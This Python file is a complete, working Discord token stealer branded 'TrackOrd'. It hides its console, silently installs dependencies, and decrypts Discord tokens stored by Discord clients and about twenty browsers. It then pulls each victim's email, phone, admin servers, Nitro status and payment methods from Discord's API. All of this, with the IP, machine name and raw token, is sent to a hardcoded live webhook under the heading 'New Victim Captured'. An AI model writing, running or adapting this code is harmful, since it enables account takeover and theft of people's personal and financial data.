import ctypes
import sys
import os

# HIDE CONSOLE IMMEDIATELY
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# REDIRECT ALL OUTPUT TO NULL (prevents any console display)
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# YOUR ORIGINAL CODE STARTS HERE
import subprocess
import json
import urllib.request
import re
import base64
import datetime

if os.name != "nt":
    exit()

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + r"\\discord",
    "Discord Canary": ROAMING + r"\\discordcanary",
    "Lightcord": ROAMING + r"\\Lightcord",
    "Discord PTB": ROAMING + r"\\discordptb",
    "Opera": ROAMING + r"\\Opera Software\\Opera Stable",
    "Opera GX": ROAMING + r"\\Opera Software\\Opera GX Stable",
    "Amigo": LOCAL + r"\\Amigo\\User Data",
    "Torch": LOCAL + r"\\Torch\\User Data",
    "Kometa": LOCAL + r"\\Kometa\\User Data",
    "Orbitum": LOCAL + r"\\Orbitum\\User Data",
    "CentBrowser": LOCAL + r"\\CentBrowser\\User Data",
    "7Star": LOCAL + r"\\7Star\\7Star\\User Data",
    "Sputnik": LOCAL + r"\\Sputnik\\Sputnik\\User Data",
    "Vivaldi": LOCAL + r"\\Vivaldi\\User Data\\Default",
    "Chrome SxS": LOCAL + r"\\Google\\Chrome SxS\\User Data",
    "Chrome": LOCAL + r"\\Google\\Chrome\\User Data\\Default",
    "Epic Privacy Browser": LOCAL + r"\\Epic Privacy Browser\\User Data",
    "Microsoft Edge": LOCAL + r"\\Microsoft\\Edge\\User Data\\Default",
    "Uran": LOCAL + r"\\uCozMedia\\Uran\\User Data\\Default",
    "Yandex": LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default",
    "Brave": LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Iridium": LOCAL + r"\\Iridium\\User Data\\Default"
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += r"\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    with open(path + r"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    checked = []
    webhook_url = "https://discord.com/api/webhooks/1447925854016508021/MnC95Tp9RwVh2bIWhpMvwcatZ-8oWUjscCVV4iyVFZa6bvpEiGL3woO38m11QbqMV0Ry"
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
                    AES.MODE_GCM,
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())
                badges = ""
                flags = res_json['flags']
                if flags in [64, 96]:
                    badges += ":BadgeBravery: "
                if flags in [128, 160]:
                    badges += ":BadgeBrilliance: "
                if flags in [256, 288]:
                    badges += ":BadgeBalance: "
                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""
                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""
                        if res["vanity_url_code"] is not None:
                            vanity = f"; .gg/{res['vanity_url_code']}"
                        guild_infos += f"\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"
                if guild_infos == "":
                    guild_infos = "No guilds"
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += ":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for slot in res:
                    cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += "\nㅤ- Available now"
                        available += 1
                    else:
                        print_boost += f"\nㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}"
                    boost = True
                if boost:
                    badges += ":BadgeBoost: "
                payment_methods = 0
                payment_type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        payment_type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        payment_type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                print_nitro = f"Has Nitro: {'Yes' if has_nitro else 'No'}\nExpiration Date: {{exp_date or 'N/A'}}\nBoosts Available: {available}\n{print_boost if boost else ''}"
                nnbutb = f"Boosts Available: {available}\n{print_boost if boost else ''}"
                print_pm = f"Amount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {payment_type}"
                nitro_text = print_nitro if has_nitro else (nnbutb if available > 0 else 'No Nitro')
                pm_text = print_pm if payment_methods > 0 else 'None'
                embed_user = {
                    "embeds": [
                        {
                            "title": "New Victim Captured",
                            "color": 0xFF4500,
                            "fields": [
                                {
                                    "name": "👤 User Details",
                                    "value": f"**ID:** {res_json['id']}\n**Username:** {res_json['username']}\n**Email:** {res_json['email']}\n**Phone:** {res_json['phone'] or 'None'}\n**Flags:** {flags} {badges}\n**Locale:** {res_json['locale']}\n**Verified:** {'Yes' if res_json['verified'] else 'No'}\n**MFA:** {'Enabled' if res_json['mfa_enabled'] else 'Disabled'}",
                                    "inline": True
                                },
                                {
                                    "name": "🏰 Guilds & Admins",
                                    "value": f"**Total:** {guilds}\n**Admin Servers:**\n{guild_infos or 'None'}",
                                    "inline": True
                                },
                                {
                                    "name": "💎 Nitro & Boosts",
                                    "value": f"```yaml\n{nitro_text}\n```",
                                    "inline": True
                                },
                                {
                                    "name": "💳 Payment Methods",
                                    "value": f"```yaml\n{pm_text}\n```",
                                    "inline": True
                                },
                                {
                                    "name": "🌐 System Info",
                                    "value": f"**IP:** {getip()}\n**PC:** {os.getenv('COMPUTERNAME')}\n**User:** {os.getenv('USERNAME')}\n**From:** {platform}",
                                    "inline": False
                                },
                                {
                                    "name": "🔑 Access Token",
                                    "value": f"```yaml\n{token}\n```",
                                    "inline": False
                                }
                            ],
                            "footer": {
                                "text": "TrackOrd, made by mystixx.dev | discord.gg/ZtxzMdHkQz"
                            },
                            "thumbnail": {
                                "url": f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "TrackOrd - Token Grabber",
                    "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true"
                }
                urllib.request.urlopen(urllib.request.Request(webhook_url, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                continue
    try:
        pass
    except (EOFError, RuntimeError):
        pass

if __name__ == "__main__":
    main()
